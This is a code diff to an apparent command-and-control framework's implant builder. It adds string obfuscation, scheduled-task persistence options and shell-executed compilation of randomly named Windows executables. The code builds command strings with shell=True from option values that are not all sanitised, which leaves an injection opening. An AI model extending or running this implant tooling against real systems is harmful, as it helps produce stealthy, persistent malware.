@@ -1,7 +1,9 @@
 from dataclasses import dataclass, asdict, field
 from typing import Optional
-from crypto.utils import random_hex
+from maliketh.crypto.utils import random_hex
 import subprocess
+import os
+import sys
 
 # Options that can be changed (for the implant) at compile time
 # These are the options that are set in the builder
@@ -21,7 +23,7 @@ def cleanup_str(s: str) -> str:
     """
     return "".join([c for c in s if c.isalnum()])
 
-@dataclass(frozen=True)
+@dataclass
 class BuilderOptions:
     initial_sleep_seconds: int = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["initial_sleep_seconds"])
     schtask_persist: bool = field(default=IMPLANT_DEFAULT_BUILD_OPTIONS["schtask_persist"])
@@ -128,14 +130,14 @@ class ImplantBuilder:
         
         # Ensure the build options are valid
         options = self._builder_options.to_dict()
-        if any(options.values() is None):
-            raise Exception("Invalid build options")
+        if any([type(v) == str and len(v) == 0 for v in options.values()]):
+            return None
         
         # Create the compiler flags
-        compiler_flags = self.__create_compiler_flags()
+        compiler_flags = ' '.join(self.__create_compiler_flags())
 
         # Create the compiler command
-        compiler_command = f"BUILDER_OPTS=\"{compiler_flags}\" ./build_release.sh"
+        compiler_command = f"BUILDER_OPTS=\"{compiler_flags}\" /implant/build-release.sh"
 
         # Build the implant
         try:
@@ -152,30 +154,33 @@ class ImplantBuilder:
         """
         for k, v in self._builder_options.to_dict().items():
             if type(v) == bool:
-                yield f"-D{str(v).upper()}"
-            if type(v) == str:
-                yield f"-D{k.upper()}='{cleanup_str(v)}'"
-            yield f"-D{k.upper()}={v}"
+                yield f"-D{k.upper()}={str(v).upper()}"
+            elif type(v) == str:
+                yield f"-D{k.upper()}='OBFUSCATED(\\\"{cleanup_str(v)}\\\")'"
+            else:
+                yield f"-D{k.upper()}={v}"
         
     def __build_implant(self, compiler_command: str) -> bytes:
         """
         Build the implant
         """
 
-        filename = f"{random_hex(16)}.exe"
+        filename = f"/implant/{random_hex(16)}.exe"
         compiler_command = f"RELEASE_OUTFILE={filename} {compiler_command}"
 
+        print(compiler_command, file=sys.stderr)
+        print(os.getcwd(), file=sys.stderr)
         # Execute compiler command
-        subprocess.run(compiler_command, shell=True, check=True)
+        subprocess.run(compiler_command, shell=True, check=True, cwd='/implant')
 
         # Read the compiled implant
         with open(filename, "rb") as f:
-            implant = f.read()
+            implant_bytes = f.read()
 
         # Delete the compiled implant
         subprocess.run(f"rm {filename}", shell=True, check=True)
 
-        return implant
+        return implant_bytes
 
 
 
